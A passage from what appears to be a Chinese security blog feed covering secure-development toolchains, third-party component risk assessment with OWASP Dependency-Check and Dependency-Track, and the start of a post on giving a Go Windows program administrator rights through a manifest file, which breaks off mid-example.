alt="20210618-02.png"></p><p>由于企业的开发人员的技术参差不齐，部分相关开发者心中没有安全的相关概念、项目的上线及迭代更新没有相应的规范等等，这些问题都将会是导致出现安全问题的根本原因,而安全开发规范流程正是从根本原因解决这些问题。安全开发对软件开发过程中所有参与该项目的相关角色，都将引入相关的安全概念，形成一个闭环，从而解决出现安全的根本问题。对于拥有庞大的开发团队的组织，由于大量的开发人员以及产品的频繁迭代，推动安全开发规范流程是目前最好的减少相关应用产品的安全问题的解决方案。</p><h3 id="完善安全开发工具链"><a href="#完善安全开发工具链" class="headerlink" title="完善安全开发工具链"></a>完善安全开发工具链</h3><p>构建合适的安全开发体系需要使用工具进行支撑，整体的流程可以使用安全开发管控平台来管理，每个阶段又会执行多个安全活动，调用多个工具来检测防护。以下国内外常见的安全工具链。</p><p>Gartner安全开发工具链<br><img src="/img/20210618-05.jpg" alt="20210618-05.jpg"></p><p>悬镜安全开发工具链<br><img src="/img/20210618-04.png" alt="20210618-04.png"></p><p>某证券DevSecOps落地实践<br><img src="/img/20210618-06.jpg" alt="20210618-06.jpg"></p><p>默安DevSecOps工具链<br><img src="/img/20210618-07.png" alt="20210618-07.png"></p><h4 id="安全开发管控平台"><a href="#安全开发管控平台" class="headerlink" title="安全开发管控平台"></a>安全开发管控平台</h4><p>以企业应用开发全生命周期为基础，以安全基线、安全开发指引、信息资产管理、开源组件漏洞扫描、源代码扫描、安全运维管理等为核心，构建知识库、集成安全工具的安全开发管控平台。实现安全开发自动化，知识化，安全管理统一化、安全运营标准化。平台包含了各阶段流程的梳理、评审机制的建立、相关资源库的建设，通过数据接口收集各阶段安全数据、开发数据及漏洞样本，打造覆盖应用开发安全建设和使用全生命周期的一体化安全管控平台。以下是常见的安全开发管控平台架构图：</p><p>某金融机构安全开发运营管理平台<br><img src="/img/20210618-03.png" alt="20210618-03.png"></p><p>开源网安SDL流程图<br><img src="/img/20210618-08.png" alt="20210618-08.png"></p><h4 id="软件成分分析SCA"><a href="#软件成分分析SCA" class="headerlink" title="软件成分分析SCA"></a>软件成分分析SCA</h4><p>软件物料清单实际上就是构成软件程序或应用程序的成分列表。软件物料清单实际上就是构成软件程序或应用程序的成分列表。与汽车行业一样，这些组件可能来自成千上万家供应商——没错，现代软件其实就是由开源及商业解决方案，再加上少量代码与子程序所拼接而成的。这种软件代码复用机制，使得开发人员不必从零开始重新创建所有内容，从而显著节约时间并提高应用程序开发效率。在软件行业，SBOM（Software Bill of Material，软件物料清单）会记录代码库中所有开放源代码和第三方组件的列表，可以列出并管理这些组件的许可证，代码库中使用的组件的版本及其补丁程序状态。</p><table><thead><tr><th>字段</th><th>SPDX值</th><th>SWID值</th></tr></thead><tbody><tr><td>供应商</td><td>（3.5） PackageSupplier:</td><td>&lt;Entity&gt; @role (softwareCreator&#x2F;publisher),@name</td></tr><tr><td>组件</td><td>（3.1）PackageName:</td><td>&lt;softwareIdentity&gt; @name</td></tr><tr><td>唯一标识</td><td>（3.2）SPDXID:</td><td>&lt;softwareIdentity&gt; @tagID</td></tr><tr><td>版本</td><td>（3.3）PackageVersion:</td><td>&lt;softwareIdentity&gt; @version</td></tr><tr><td>组件散列值</td><td>（3.10）PackageChecksum:</td><td>&lt;Payload&gt;&#x2F;..&#x2F;&lt;File&gt;@[hash-algorithm]:hash</td></tr><tr><td>相互关系</td><td>（7.1）Relationship:CONTAINS</td><td>&lt;Link&gt;@rel,@href</td></tr><tr><td>SBOM编辑人</td><td>（2.8）Creator:</td><td>&lt;Entity&gt; @role (tagCreator),@name</td></tr></tbody></table><p>下图为软件物料清单中组件关系的基本关系，左侧表格为需要跟踪的信息，右侧图形则展示了各软件组件间的关系。</p><p><img src="/img/20210618-09.jpg" alt="20210618-09.jpg"></p><p>软件成分分析系统允许企业更早识别并缓解系统或许可源代码内的潜在缺陷，因此有效控制风险。此外，软件成分分析系统还将帮助开发人员更好地审查嵌入至当前项目中的成品代码，推动软件开发安全实践的普及。而在软件使用者方面，更高的透明度则能够有力支持采购决策，轻松了解开发方是否严格遵循软件许可要求。软件成分分析系统的最大意义，很可能体现在网络安全保障与风险控制层面。</p><p>目前开源SCA可以尝试owasp社区提供的dependency check 和dependency track，国内主要安全厂商均有自己的SCA安全产品，有能力的小伙伴可以自行尝试。</p><h4 id="源代码审计工具"><a href="#源代码审计工具" class="headerlink" title="源代码审计工具"></a>源代码审计工具</h4><p>目前源代码审计主流AST（Abstract Syntax Tree(抽象语法树)）工具分为：SAST,DAST,IAST。</p><p>DAST：动态应用程序安全测试（Dynamic Application Security Testing）技术在测试或运行阶段分析应用程序的动态运行状态。它模拟黑客行为对应用程序进行动态攻击，分析应用程序的反应，从而确定该Web应用是否易受攻击。</p><p>SAST：静态应用程序安全测试（Static Application Security Testing）技术通常在编码阶段分析应用程序的源代码或二进制文件的语法、结构、过程、接口等来发现程序代码存在的安全漏洞。</p><p>IAST：交互式应用程序安全测试（Interactive Application Security Testing）是2012年Gartner公司提出的一种新的应用程序安全测试方案，通过代理、VPN或者在服务端部署Agent程序，收集、监控Web应用程序运行时函数执行、数据传输，并与扫描器端进行实时交互，高效、准确的识别安全缺陷及漏洞，同时可准确确定漏洞所在的代码文件、行数、函数及参数。IAST相当于是DAST和SAST结合的一种互相关联运行时安全检测技术。</p><p>目前SAST平台较多，常见的有sonarqube、fortify、checkmarx等等，DAST\IAST平台较少，目前只有少数几个厂商发布过类似产品，产品性能有待商榷。</p><h4 id="安全扫描平台"><a href="#安全扫描平台" class="headerlink" title="安全扫描平台"></a>安全扫描平台</h4><p>web，app,主机，容器等场景下远程漏洞扫描与评估，主要安全厂商都有，开源产品也不错，这个不过多介绍。</p><h4 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h4><p>威胁建模是从攻击者的角度出发，通过对软件自身内部的数据流分析来识别威胁是否存在，并对威胁进行一定程度上的评价。对于高风险的威胁，我们给出对应的消减措施以便指导开发人员。通过采用相应技术、增加相关功能软件在开发过程中即可有效的规避风险，提高应用系统开发中软件代码的安全性、降低软件维护和升级的成本。<br>威胁建模的优点：</p><ul><li>通过威胁建模进行安全的设计</li><li>威胁建模有利于更好地理解应用程序</li><li>威胁建模可以帮助查找bug</li><li>通过威胁建模可以发现以其他任何方式都不太可能发现的复杂的设计bug</li><li>威胁建模可以帮助新的小组成员理解应用程序的细节</li><li>威胁建模应该能让基于产品的其他开发小组用到</li><li>威胁建模对测试人员非常有用</li></ul><p>常用的威胁工具有：Microsoft的Threat Modeling Tool 和 owasp的owasp-threat-dragon。</p><h4 id="自动化安全需求分析"><a href="#自动化安全需求分析" class="headerlink" title="自动化安全需求分析"></a>自动化安全需求分析</h4><p>基于企业专家级知识库及行业最佳实践等，通过AI智能匹配、模型算法、功能场景匹配等，自动化分析业务需求，进而推导出安全需求。通过这种方式可以减少安全人员重复性工作，降低安全需求分析人员门槛。目前该方向国内主流厂商都积极发力，均有类似安全产品，截止博客发稿，博主尚未找可替代的开源产品。</p><h4 id="应用防护RASP"><a href="#应用防护RASP" class="headerlink" title="应用防护RASP"></a>应用防护RASP</h4><p>随着Web应用攻击手段变得复杂，基于请求特征的防护手段，已经不能满足企业安全防护需求。在2012年的时候，Gartner引入了“Runtime application self-protection”一词，简称为RASP，属于一种新型应用安全保护技术，它将防护功能“ 注入”到应用程序中，与应用程序融为一体，使应用程序具备自我防护能力，当应用程序遭受到实际攻击伤害时，能实时检测和阻断安全攻击，而不需要进行人工干预。<br><img src="/img/20210618-10.png" alt="20210618-10.png"></p><p>目前RASP产品国内有百度，默安，悬镜，腾讯等多家厂商研发，百度已将自家研发的openrasp进行开源，有兴趣的小伙伴可以尝试以下。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于供应链安全，目前主要的思路是基于软件开发生命周期进行防护，通过咨询体系建设和工具链结合的形式进行落地，目前在工具链的构建过程当中，尤其是devsecops工具链构建，由于需要跨越软件开发的多个阶段并且工具链覆盖多家平台，这样的情况造成数据无法通用的弊端，检测标准无法在工具链上做到统一，安全运营人员无法通过检测数据来回溯或者考核相关参与人员，个人感觉后续数据拉通是各家厂商需要发力的方向。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.secrss.com/articles/25216">https://www.secrss.com/articles/25216</a>【建立软件物料清单 (SBOM) 标准的必要性分析】</li><li><a href="https://paper.seebug.org/330/">https://paper.seebug.org/330/</a>【Rasp 技术介绍与实现】</li><li><a href="https://security.tencent.com/index.php/blog/msg/166">https://security.tencent.com/index.php/blog/msg/166</a>【RASP攻防 —— RASP安全应用与局限性浅析】</li><li><a href="https://en.wikipedia.org/wiki/Supply_chain_attack">https://en.wikipedia.org/wiki/Supply_chain_attack</a>【Supply chain attack】</li><li><a href="https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf">https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf</a>【Defending Against Software Supply Chain Attacks】</li><li><a href="https://www.csoonline.com/article/3191947/supply-chain-attacks-show-why-you-should-be-wary-of-third-party-providers.html">https://www.csoonline.com/article/3191947/supply-chain-attacks-show-why-you-should-be-wary-of-third-party-providers.html</a>【Supply chain attacks show why you should be wary of third-party providers】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Software Supply Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第三方组件安全评估指南</title>
    <link href="/2021/06/16/2020-12-16-dependency-check/"/>
    <url>/2021/06/16/2020-12-16-dependency-check/</url>
    
    <content type="html"><![CDATA[<p>第三方组件安全评估指南</p><p>组件安全这个话题太大，从去年就一直构思，不知道该怎么写，大半年了，拖延癌晚期，今天终于拼凑了一篇，最近主要在整理组件安全相关方案，感兴趣的童鞋可以给我留言一块交流。</p><hr><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>常见第三方组件分为开源和闭源两种情况，广义上的开源组件实际上就是基于各种协议公布源代码让所有人使用的软件依赖，源代码只要遵守对应的协议就可以使用，我们在这里说的开源软件实际上是Open-Source Software的缩写，闭源组件通常由第三方公司提供，方便研发人员实现业务功能而进行统一定制化的，包括依赖库、SDK等等。系统开发中使用的开源外部依赖库如果存在安全风险，会严重威胁系统安全。为全面把控第三方依赖库安全威胁情况，降低外部依赖库带来的安全风险，提高系统整体安全防护能力，应建立相应的第三方组件全生命周期管理体系，对第三方组件进行漏洞检测、修复、报告、跟踪，及时根据官方漏洞修复方案进行漏洞修复。系统上线前，由架构组或者开发组对漏洞检测结果、修复方案、修复结果、未修复原因等信息进行汇总整理，方便后续对第三方组件进行全生命周期管理。<br>随着时间的推移，第三方组件的安全风险会不断被发现，所以第三方组件生命周期管理是一个持续迭代的过程，建议对第三方组件在引入前、上线前进行安全评估，在系统发版后对第三方组件进行追踪，定期进行安全评估工作。</p><h2 id="评估要点"><a href="#评估要点" class="headerlink" title="评估要点"></a>评估要点</h2><p>评估要点主要为以下三点：</p><pre><code>* 组件安全风险* 组件合规风险 * 组件的稳定性 </code></pre><h3 id="组件的安全风险"><a href="#组件的安全风险" class="headerlink" title="组件的安全风险"></a>组件的安全风险</h3><p>近年来，针对软件供应链的安全攻击事件一直呈快速增长态势，造成的危害越来越严重，防范软件供应链安全风险，已经迫在眉睫；<br>开源软件漏洞频现：截至2020年底，CVE&#x2F;NVD、CNNVD、CNVD等公开漏洞库中共收录开源软件相关漏洞41342个，其中高达13%（5366个）为2020年度新增漏洞；<br>研究发现：近9成软件项目存在已知开源软件漏洞；平均每个软件项目存在66个已知开源软件漏洞；影响最广的开源软件漏洞存在于44.3%的软件项目中；15年前开源软件漏洞仍存在于多个软件项目中。<br>2020年 “奇安信开源项目检测计划”对1364个开源软件项目的源代码安全检测显示：开源软件项目整体缺陷密度为14.96个&#x2F;千行，高危缺陷密度为0.95个&#x2F;千行；</p><table><thead><tr><th>序号</th><th>组织类型</th><th>缺陷密度(个&#x2F;千行代码)</th></tr></thead><tbody><tr><td>1</td><td>普通软件工程师</td><td>50~250</td></tr><tr><td>2</td><td>普通软件开发公司</td><td>4-40</td></tr><tr><td>3</td><td>高水平软件开发公司</td><td>2~4</td></tr><tr><td>4</td><td>美国NASA</td><td>0.1</td></tr><tr><td>5</td><td>国内软件公司</td><td>6</td></tr></tbody></table><h3 id="组件的合规风险"><a href="#组件的合规风险" class="headerlink" title="组件的合规风险"></a>组件的合规风险</h3><p>合规风险主要来源于两方面，一方面是开源协议滥用导致的安全风险，另一方面是来之监管合规的风险。</p><blockquote><ul><li>《中华人民共和国网络安全法》第三十三条规定，建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。该条规定，明确了关键信息基础设施的安全工作应该前移，在信息系统的规划阶段就应该保证安全技术措施的介入。</li><li>信息安全技术网络安全等级保护基本要求【GBT22239-2019】中要求企业自行软件开发应制定代码编写安全规范，要求开发人员参照规范编写代码，在软件开发过程中对安全性进行测试，在软件安装前对可能存在的恶意代码进行检测；对外包软件开发应在软件交付前检测其中可能存在的恶意代码。</li><li>2019年，中国银保监会办公厅文件【银保监办发（2019）129号】文《中国银保监会办公厅关于开展银行业和保险业网络安全专项治理工作的通知》中提出建立新技术引入、开源技术应用安全评估与准入机制，加强科技创新、新技术应用的风险监测与处置。</li><li>2020年，中国人民银行办公厅文件【银办发（2020）45号】文《中国人民银行办公厅关于开展金融科技应用风险专项摸排工作的通知》中提出应不定期组织针对开源系统或组件的安全测评，及时进行漏洞修复和加固处理。</li></ul></blockquote><p>对于开源协议不清楚的看官可以直接参考乌克兰程序员Paul Bagwell画的开源协议分析图，介绍最流行的六种开源许可证—-GPL、BSD、MIT、Mozilla、Apache和LGPL。</p><p><img src="/img/20201216-01.png" alt="20201216-01"></p><h3 id="组件的稳定性"><a href="#组件的稳定性" class="headerlink" title="组件的稳定性"></a>组件的稳定性</h3><p>开源社区维护者和贡献者为我们所有人构建工具，为我们日常的开发提供了很大的帮助，但开源社区的贡献者自身却面临诸多问题，这些问题一定程度上影响了开源软件的可持续发展，开源项目的可持续性也一直存在矛盾。这一矛盾导致很多开源软件在最初更新迭代比较快速，文档书写也比较及时，后面却可能出现一些人员离职等问题，导致该开源产品后续的更新不及时，甚至直接中断，这时使用该开源产品的的同学在反馈问题时往往需要很长时间才会得到答复，甚至得不到答复。</p><blockquote><ul><li>除非是非常成熟的开源项目，否则其稳定性是未经考验的，这也是使用开源项目在真正进入持续商业化时所遇到的最大挑战！关于一个项目是否“成熟”，这是个非常主观的问题，如果用Github的star数量来衡量，要充分考虑中国式开源通过运营人头来点赞的模式，即便有1-2万颗星，也并不意味着项目已经成熟了。另外，要看Top-100的贡献者，很多所谓的开源项目几乎所有的贡献者都是项目所在公司的内部员工，这种开源项目的成熟度能有多少呢？</li><li>像MySQL，Redis之类这么稳定的项目并不常见，即便是像MongoDB这么宏大的开源项目，一旦进入大规模部署后对于任何中小公司而言都是巨大的挑战，一旦无法克服，会深陷泥潭难以自拔。</li><li>国内市场上一度火爆的TFS(Taobao File System&#x3D;淘宝文件系统)，曾经受到很多程序员的追捧，但是很少有人仔细的分析过淘宝的应用场景和对该项目的支持力度，现在该项目已经寿终正寝（淘宝团队不再维护该项目），而且淘宝当时设计的目的是支持海量小文件，而有多少创业项目是一样的业务需求呢？很多人盲目的上马了TFS，到头来发现系统稳定性很差而且有无数的问题，这些是小团队、二次开发能力并不强悍的团队可以承受得了的吗？<br><a href="https://zhuanlan.zhihu.com/p/361101335">https://zhuanlan.zhihu.com/p/361101335</a></li></ul></blockquote><h2 id="评估方法"><a href="#评估方法" class="headerlink" title="评估方法"></a>评估方法</h2><h3 id="组件评估方法"><a href="#组件评估方法" class="headerlink" title="组件评估方法"></a>组件评估方法</h3><p>组件评估方法仅适用于对组件的安全风险进行评估，评估方法如下：</p><pre><code>* 使用评估检测工具* 人工复核排查* 源代码审计</code></pre><h4 id="组件安全检测工具"><a href="#组件安全检测工具" class="headerlink" title="组件安全检测工具"></a>组件安全检测工具</h4><h5 id="dependency-check"><a href="#dependency-check" class="headerlink" title="dependency check"></a>dependency check</h5><p>检测人员可使用开源工具Dependency-Check对外部依赖库进行扫描，Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序，用于识别项目依赖项并检查是否存在任何已知的、公开披露的漏洞。Dependency-Check可以命令行形式单独使用，也可集成到各种主流的软件中使用，如Ant、Maven、Gradle、Jenkins、Sonar等。</p><p>首先，使用扫描工具Dependency-check对外部依赖库进行扫描，收集整理项目所用外部依赖库，可用Dependency-Check对其进行批量扫描。Dependency-check具体使用方法参见<a href="https://jeremylong.github.io/DependencyCheck/dependency-check-cli/arguments.html">https://jeremylong.github.io/DependencyCheck/dependency-check-cli/arguments.html</a> 。以下将介绍Dependency-Check的命令行使用方式，开发项目组也可将Dependency-Check集成到所使用的软件（如Ant、Maven、Gradle、Jenkins、Sonar等）中使用：</p><p>1、进入官网owasp.org&#x2F;www-project-dependency-check&#x2F;下载最新版本的Dependency-check，选择Command Line进行下载。下载完成后进行解压即可开始使用。</p><p>2、建议每次执行新的扫描任务之前，更新规则库，在命令行窗口进入Dependency-Check的bin目录下，输入更新命令即可完成规则库的更新：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">dependency-<span class="hljs-keyword">check</span> –updateonly<br></code></pre></td></tr></table></figure><p>3、更新完成后，开始进行外部依赖库漏洞的扫描，常用扫描命令如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Dependency-check <span class="hljs-attr">--project</span> &lt;project name&gt; <span class="hljs-attr">--scan</span> &lt;jar <span class="hljs-selector-tag">path</span>&gt; <span class="hljs-attr">--out</span> &lt;result <span class="hljs-selector-tag">path</span>&gt; <span class="hljs-attr">--format</span> &lt;XML/<span class="hljs-selector-tag">HTML</span>/CSV/JSON/JUNIT/<span class="hljs-attribute">ALL</span>&gt; <span class="hljs-attr">--disableCentral</span><br></code></pre></td></tr></table></figure><p>4、打开命令行中的扫描结果存放路径，有多种不同格式的结果，使用“.csv”格式的文件，可方便对扫描结果进行初步整理，保留“DependencyName”、“Md5”、“CVE”、“Vulnerability”、“Severity”等必须项，简化表格，并且在表格中添加与后期修复相关的必须项。</p><p>扫描后的结果需人工排除误报，使用工具扫描出来的检测结果存在误报的情况，可能原因包括漏洞与所述组件无关、引发漏洞的方法未被调用、引发漏洞的配置未启用等。需要根据CVE官网上的漏洞介绍、官方漏洞说明结合源代码和修复方法人工进行逐一排查，确认所用组件是否存在扫描结果中所述漏洞，并确定每个漏洞的修复方法，组件安全风险复核是一件相当费时费力的工作。</p><h5 id="dependency-track"><a href="#dependency-track" class="headerlink" title="dependency track"></a>dependency track</h5><p>Dependency-Track是一个软件组合分析（SCA）平台，用于跟踪组织创建或使用的所有应用程序中使用的所有第三方组件。它集成了多个漏洞数据库，包括国家漏洞数据库（NVD）、NPM公告、 Sonatype的OSS漏洞库(通过API接口查询)、RiskBased Security的漏洞库。Dependency-Track监控项目中每个应用程序所有版本组件使用情况，以便主动识别整个项目的安全风险。该平台采用API接口设计，非常适合在 CI&#x2F;CD 环境中集成使用。</p><p><img src="/img/20201216-02.jpg" alt="20201216-02.jpg"></p><p>dependency track 具有以下特点：</p><ul><li>自动、持续监测依赖安全性 </li><li>多种类的漏洞数据库 </li><li>丰富的可视化功能</li><li>持续集成友好</li><li>可通过多种渠道发送告警</li><li>AD&#x2F;LDAP集成</li><li>丰富的API</li></ul><p>使用其他sbom提取工具，通过接口调用或者直接上传sbom到dependency track，dependency track通过分析sbom，分析组件安全风险，通过仪表盘可以直观追踪安全态势<br><img src="/img/20201216-03.jpg" alt="20201216-03.jpg"></p><p>使用方法及部署方法较为复杂，后续会单独出一篇文章来详细介绍。</p><h4 id="闭源组件"><a href="#闭源组件" class="headerlink" title="闭源组件"></a>闭源组件</h4><p>从《个人信息安全规范》新标准的规定可以看出，关于对第三方接入的管理，与共享、转让、委托处理中的规定和责任相似，例如，包括在事前建立第三方产品或服务接入管理机制，在接入后对第三方产品和服务进行持续监督、通过签署合同约束双方责任、需要明确告知个人信息主体服务由第三方提供、对记录进行保存、要求第三方确保个人信息主体授权同意、对第三方接入的自动化工具技术进行技术检测等等。<br>涉及安全检测，如果提供源代码，可以对源代码进行白盒审计，出于保密考虑，部分单位拒绝提供源代码，可以通过厂商提供的demo，结合接口文档，组件设计文档进行安全评估。</p><h3 id="组件安全运营"><a href="#组件安全运营" class="headerlink" title="组件安全运营"></a>组件安全运营</h3><p>建议外部依赖库扫描时机为引入前扫描、上线前扫描、定期扫描：</p><pre><code>1、引入前扫描：在引入外部依赖库前，对所用版本进行扫描，保证当前使用的外部依赖库版本不存在漏洞，减少后期升级、维护成本。2、上线前扫描：系统测试阶段或上线前，对系统所使用的外部依赖库进行一次统一扫描，确保上线前外部依赖库不存在公开的高危漏洞。3、定期扫描：定期对系统使用的外部依赖库进行统一扫描，以全面把控和修复不断暴露出的外部依赖库漏洞。</code></pre><p>外部依赖库检测可遵循工具扫描、排除误报、制定修复建议、实施修复的流程进行，形成检测和修复报告，作为开发阶段交付物。<br>对于线上系统，可以构建组件清单列表，遵循基于组件生命周期的安全解决方案，结合组件威胁情报，一旦某个开源组件出现漏洞，可以通过清单列表迅速排查。以下是基于开源软件生命周期的供应链安全解决方案，供各位参考：</p><p><img src="/img/20201216-04.png" alt="20201216-04.jpg"></p><p><img src="/img/20201216-05.png" alt="20201216-05.jpg"></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>部分外部依赖包可能存在多个漏洞，需综合各个漏洞，为外部依赖包制定整体的修复方案：问题依赖库对应的各CVE漏洞均有一个修复建议，需根据每个外部依赖包涉及的CVE漏洞的修复方法，考虑到同一依赖包不同漏洞可能存在不同的修复建议，不同依赖包之间可能存在关联依赖关系，建议采用就高不就低原则，综合考虑，形成每个外部依赖包的整体修复建议。<br>开发团队需根据每个外部依赖包的整体修复建议，采用升级或调整配置等方式，修复外部依赖包的漏洞。在修复时，可参考以下方式：</p><p>1、确定各依赖包的作用，确定各依赖包在系统中的使用情况，排查系统中涉及的版本不同但功能相同的重复依赖包。 </p><p>2、根据整体修复建议，查找符合条件的版本。</p><p>3、查看各依赖包与其他依赖包是否存在依赖关系：如功能独立，则直接升为建议版本；如存在依赖关系，则需要同时升级相关依赖包，并在应用中验证兼容性。</p><h2 id="问题解决机制"><a href="#问题解决机制" class="headerlink" title="问题解决机制"></a>问题解决机制</h2><p>外部依赖库在升级过程中可能存在以下客观困难：</p><p>1、某一依赖包升级（如spring相关依赖包），与此依赖包存在依赖关系的其他jar包均需同步升级，工作量及影响均特别大。</p><p>2、依赖包升级后可能存在不兼容、功能不可用问题，除测试其编译是否成功以及基本功能验证之外，对于升级之后对系统带来的影响，还需进行充分的单元测试或系统测试。</p><p>3、可能有些外部依赖包来源于采购的产品，若需升级依赖包，则需联系产品提供商进行升级。</p><p>基于上述困难和问题，开发团队经过验证和评估，对于无法升级到建议版本、升级难度较大或联系产品厂商进行升级存在困难的依赖包，提请安全架构决策。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>持续构建物料清单</p><p>  为每个应用程序持续构建详细的软件材料清单，从而全面洞察每个应用软件的组件情况。如果存在无法验证来源的开源组件，则不允许使用。</p></li><li><p>强化软件供应链</p><p>  通过强化软件供应链来降低安全风险。这包括检查内部和外部源代码、支持脚本、配置文件和其他工件，并创建可信开源组件的内部存储库。而对外部存储库的使用要合理管理。</p></li><li><p>风险管理</p><p>  通过制定策略确定可接受的开源组件、对在代码中发现漏洞或受限软件许可的合理响应，来管理风险。</p></li></ul><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>1、企业要有清单列表记录哪些产品使用了哪些开源组件。一旦某个开源组件出现漏洞，可以通过清单列表迅速排查。该清单列表也正是Gartner提到的材料清单，将在开源组件管控过程中发挥重要的作用。 </p><p>2、企业要有清单列表记录禁用的开源组件，即，开源组件黑名单。对于那些安全问题比较多、风险较大的第三软件，应加入到这个禁用清单列表中禁止使用。 </p><p>3、企业对于使用较多的开源组件，建议执行静态代码扫描或其他必要的安全测试，提早识别安全漏洞。对于发现的漏洞，提交开源社区，并促使开源社区修复。 </p><p>4、对于开源组件的使用要有安全性指导（主要是规避一些因配置不当引入的安全问题）。 </p><p>5、慎用对安全问题处理态度消极的厂商所开发的开源组件。 </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.secrss.com/articles/19703">https://www.secrss.com/articles/19703</a>【CNCERT：2019年开源软件风险研究报告】</li><li><a href="https://www.sec-un.org/%E6%B5%85%E8%B0%88%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E4%B8%8B%E9%93%B6%E8%A1%8C%E4%B8%9A%E9%87%91%E8%9E%8D%E6%9C%BA%E6%9E%84%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%BC%95%E5%85%A5/">https://www.sec-un.org/%E6%B5%85%E8%B0%88%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E4%B8%8B%E9%93%B6%E8%A1%8C%E4%B8%9A%E9%87%91%E8%9E%8D%E6%9C%BA%E6%9E%84%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%BC%95%E5%85%A5/</a>【浅谈敏捷开发模式下银行业金融机构开源软件引入风险及管控举措】</li><li><a href="https://www.freebuf.com/articles/security-management/123359.html">https://www.freebuf.com/articles/security-management/123359.html</a>【使用第三方库进行软件开发的安全风险研究 】</li><li><a href="https://en.wikipedia.org/wiki/Open-source_software_security">https://en.wikipedia.org/wiki/Open-source_software_security</a>【Open source software security】</li><li><a href="https://www.ibm.com/downloads/cas/O5PR1WLD">https://www.ibm.com/downloads/cas/O5PR1WLD</a>【如何全面提升企业开源治理能力】</li><li><a href="http://www.owasp.org.cn/OWASP_Events/3OWASP.pdf">http://www.owasp.org.cn/OWASP_Events&#x2F;3OWASP.pdf</a>【甲方安全&amp;OWASP 项目分享】</li><li><a href="https://mawei.blog/2020/dependency-practice-guide-part-one">https://mawei.blog/2020/dependency-practice-guide-part-one</a>【用DependencyTrack管理第三方组件安全】</li><li><a href="https://www.secrss.com/articles/19515">https://www.secrss.com/articles/19515</a>【关于软件供应链安全的几点思考】</li><li><a href="https://my.oschina.net/oscpyaqxylk/blog/5075907">https://my.oschina.net/oscpyaqxylk/blog/5075907</a>【关注企业开源供应链：开源有风险，使用需谨慎！】</li><li><a href="https://www.tc260.org.cn/front/postDetail.html?id=20200617152854">https://www.tc260.org.cn/front/postDetail.html?id=20200617152854</a>[2020版《个人信息安全规范》生效在即，你不得不重视的第三方接入管理规则]</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Dependency</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go windows程序使用管理员权限运行</title>
    <link href="/2021/04/28/2021-04-28-run-go-windows-software-with-administrator-priviledge/"/>
    <url>/2021/04/28/2021-04-28-run-go-windows-software-with-administrator-priviledge/</url>
    
    <content type="html"><![CDATA[<p>go windows程序使用管理员权限运行</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>写了一个windows日志收集的小工具，部分操作需要管理员权限，从网上找了几篇文章，思路都是通过Windows的.Manifest xml文件构建syso，然后打包运行即可，在此参考了几篇文章，CSDN居多，不止百度，谷歌上CSDN的文章也排名也比较靠前，但是部分文章思路没问题，但是你们的.manifest配置文件xml数据都没有闭合，导致博主在实验的时候走了不少弯路，对你们各种不负责转载的现象进行批评。以下是搜索引擎截图，部分manifest文件内容缺失，会导致程序抛出异常，对于新手，这很不友好。<br><img src="/img/20210428-01.png" alt="20210428-01"></p><h2 id="windows-manifest文件介绍"><a href="#windows-manifest文件介绍" class="headerlink" title="windows manifest文件介绍"></a>windows manifest文件介绍</h2><blockquote><p>引用微软官方docs<br>An application manifest is an XML file that describes and identifies the shared and private side-by-side assemblies that an application should bind to at run time. These should be the same assembly versions that were used to test the application. Application manifests may also describe metadata for files that are private to the application.</p></blockquote><p>通俗来讲，Manifest事实上就是一个以.manifest为后缀的XML文件，用于组织和描述隔离应用程序及并行组件，其内部的信息如<assemblyIdentity>元素则标识着一个唯一的程序集，和其他信息一起，他们用于COM类、接口及库的绑定和激活，而这些信息，以往都是存储在注册表中的。另外，Manifests也制定了组成程序集的文件及Windows类。</p><h2 id="go-windows程序使用管理员权限运行"><a href="#go-windows程序使用管理员权限运行" class="headerlink" title="go windows程序使用管理员权限运行"></a>go windows程序使用管理员权限运行</h2><h3 id="1、获取rsrc"><a href="#1、获取rsrc" class="headerlink" title="1、获取rsrc"></a>1、获取rsrc</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">go</span> install github.com/akavel/rsrc<span class="hljs-variable">@latest</span><br></code></pre></td></tr></table></figure><p>在项目根目录中创建*.manifest文件（文件名没有过多局限，不过按照要求来也没错）<br>文件内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 